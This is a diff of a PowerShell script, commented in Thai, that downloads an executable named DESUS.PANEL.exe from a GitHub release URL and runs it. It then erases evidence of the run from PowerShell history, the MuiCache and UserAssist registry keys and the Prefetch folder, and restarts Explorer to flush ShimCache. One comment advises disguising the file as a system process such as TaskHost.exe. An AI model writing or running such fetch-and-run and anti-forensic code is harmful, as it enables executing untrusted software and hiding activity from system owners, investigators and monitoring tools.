@@ -4,29 +4,49 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     exit
 }
 
-# 2. ตั้งค่าไฟล์
+# 2. ตั้งค่า (แนะนำให้เปลี่ยนชื่อไฟล์ .exe เป็นชื่อที่ดูเหมือนไฟล์ระบบ เช่น TaskHost.exe จะเนียนขึ้น)
 $url = "https://github.com/getx796-Harem/GetX/releases/download/v1.0/DESUS.PANEL.exe"
-$workDir = "$env:LOCALAPPDATA\Desus_Tool"
-$exePath = Join-Path $workDir "DESUS.PANEL.exe"
+$fileName = "DESUS.PANEL.exe"
+$workDir = "$env:LOCALAPPDATA\Temp\SystemData"
+$exePath = Join-Path $workDir $fileName
 
-# 3. สร้างโฟลเดอร์ชั่วคราว
-if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
-New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+# 3. เตรียมที่เก็บ
+if (!(Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
 
-# 4. ดาวน์โหลด
-Write-Host "[*] Downloading System..." -ForegroundColor Cyan
+# 4. ดาวน์โหลดและรัน
 Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
-
-# 5. รันและรอจนกว่าจะปิดโปรแกรม
 if (Test-Path $exePath) {
-    Write-Host "[+] Launching..." -ForegroundColor Green
     Start-Process -FilePath $exePath -WorkingDirectory $workDir -Wait
 }
 
-# 6. ลบไฟล์ทิ้งทันที
+# 5. --- เริ่มกระบวนการลบเฉพาะจุด (Targeted Cleaning) ---
+Write-Host "[*] Cleaning specific traces..." -ForegroundColor Yellow
+
+# ลบไฟล์โปรแกรม
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
 
-# 7. ล้างประวัติการพิมพ์ใน PowerShell (History)
-Clear-History
-[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
-Write-Host "[+] All traces cleared." -ForegroundColor Magenta
+# ลบประวัติ PowerShell
+$historyPath = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
+
+# ลบชื่อโปรแกรมจาก MuiCache (จุดหลักที่ LastActivityView ใช้ดึงชื่อโปรแกรม)
+$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
+Get-Item -Path $muiPath | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fileName*" } | ForEach-Object {
+    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
+}
+
+# ลบจาก AppCompatCache (ShimCache) - ต้องใช้ไม้ตายเรียกคำสั่งล้าง Cache ของระบบ
+# (ปกติ Windows จะบันทึกไฟล์ที่เคยรันไว้ใน RAM ก่อนเขียนลง Registry การ Restart Explorer ช่วยได้)
+Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
+
+# ลบจาก UserAssist (ประวัติการรันโปรแกรมของ User)
+$uaPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+Get-ChildItem -Path $uaPath | Get-ChildItem | Get-ChildItem | Where-Object { $_.Name -like "*$fileName*" } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+# ลบ Prefetch (เฉพาะไฟล์ที่เกี่ยวกับโปรแกรมนี้)
+Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*DESUS.PANEL*" | Remove-Item -Force -ErrorAction SilentlyContinue
+
+# เริ่ม Explorer ใหม่เพื่อให้ระบบ Refresh
+Start-Process Explorer
+
+Write-Host "[+] Target traces removed." -ForegroundColor Green
